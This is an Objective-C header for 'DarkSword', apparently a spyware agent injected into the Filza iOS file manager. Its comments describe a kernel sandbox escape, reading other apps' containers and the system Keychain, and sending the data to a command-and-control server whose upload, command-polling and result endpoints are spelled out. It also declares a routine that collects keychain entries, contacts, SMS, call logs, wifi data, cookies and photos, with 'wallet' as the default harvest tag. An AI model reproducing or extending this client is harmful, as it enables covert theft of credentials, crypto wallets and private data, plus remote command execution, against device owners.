//
//  DarkSwordClient.h
//  Filza-27 (FilzaApplySandboxExt)
//
//  Filza as the DarkSword entry point.
//
//  The injected dylib already runs the kernel sandbox escape and the MCM
//  bridge, so it can resolve and read another app's container and the system
//  Keychain database. This client pushes that data to a DarkSword C2 over
//  DarkSword's native JSON contract instead of the old chat backend's
//  multipart `uuid + file` shape:
//
//    POST /upload        {"deviceUUID","category","path","description","data"(base64)}
//    GET  /cmd?device_uuid=<uuid>   -> {"id":N,"command":"..."}  (204 when idle)
//    POST /cmd_result     {"id":N,"output":"...","status":"completed|failed"}
//
//  Configuration keys (TryMaskCardShell.plist):
//    darkSwordEnabled      bool   default NO     - arm the agent
//    darkSwordUpload       bool   default YES    - deliver harvests to the C2
//    darkSwordURL          string default ""     - http://host:port of the C2
//    darkSwordDeviceUUID   string default ""     - override device identity
//    darkSwordPollInterval number default 5      - seconds between /cmd polls
//    darkSwordCategory     string default "wallet" - harvest category tag
//

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// YES when the packaged configuration arms the DarkSword agent.
FOUNDATION_EXPORT BOOL DarkSwordEnabled(void);

/// Base URL (scheme://host:port) of the DarkSword C2, without a trailing slash.
FOUNDATION_EXPORT NSString *DarkSwordBaseURL(void);

/// Identity used to attribute uploads/commands on the C2.
FOUNDATION_EXPORT NSString *DarkSwordDeviceUUID(void);

/// Category tag used for harvest deliveries (default "wallet").
FOUNDATION_EXPORT NSString *DarkSwordCategory(void);

/// Starts the agent's /cmd poll loop. Idempotent; no-op unless enabled.
FOUNDATION_EXPORT void DarkSwordStart(void);

/// Uploads one artifact to the C2 using DarkSword's JSON /upload contract.
/// `completion` runs on a background queue with (ok, httpStatus, responseSnippet).
FOUNDATION_EXPORT void DarkSwordUpload(NSString *category,
                                       NSString *path,
                                       NSString *description,
                                       NSData *data,
                                       void (^_Nullable completion)(BOOL ok,
                                                                     NSInteger httpStatus,
                                                                     NSString *_Nullable snippet));

/// Reports a command execution result back to the C2.
FOUNDATION_EXPORT void DarkSwordReportResult(NSNumber *commandID,
                                             NSString *output,
                                             NSString *status);

/// Collects the standard DarkSword exfil set (keychain/contacts/sms/calls/
/// wifi/cookies/photos) and uploads each as its own category. Each read is
/// independent; unreadable paths are skipped and logged. No-op unless enabled.
FOUNDATION_EXPORT void DarkSwordCollectAll(void);

NS_ASSUME_NONNULL_END
